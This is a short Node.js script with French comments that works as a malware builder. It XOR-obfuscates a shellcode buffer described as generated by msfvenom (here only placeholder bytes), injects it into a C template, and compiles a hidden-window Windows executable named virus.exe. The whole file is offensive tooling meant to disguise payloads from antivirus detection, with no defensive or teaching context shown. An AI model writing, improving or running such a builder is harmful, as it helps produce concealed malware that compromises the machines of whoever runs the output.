#!/usr/bin/env node

const fs = require("fs");
const { exec } = require("child_process");

// Buffer généré par msfvenom
const originalBufferString = "\xde\xad\xbe\xef";
const buffer = Buffer.from(originalBufferString, "binary");

// Obfusce le buffer
for (let i = 0; i < buffer.length; i++) {
  buffer[i] = buffer[i] ^ 42;
}

// Transforme le buffer en string C
const bufferString = Array.from(buffer)
  .map((a) => "\\x" + a.toString(16))
  .join("");

// Génère le code C à partir de base.c en remplaçant <BUF> et <BUFLEN>
const base = fs.readFileSync("./base.c", "utf-8");
const replaced = base
  .replace("<BUF>", bufferString)
  .replace("<BUFLEN>", buffer.length);
fs.writeFileSync("virus.c", replaced, "utf-8");

// Compilation du code généré en .exe
exec("x86_64-w64-mingw32-gcc -mwindows -Wall virus.c -o virus.exe");
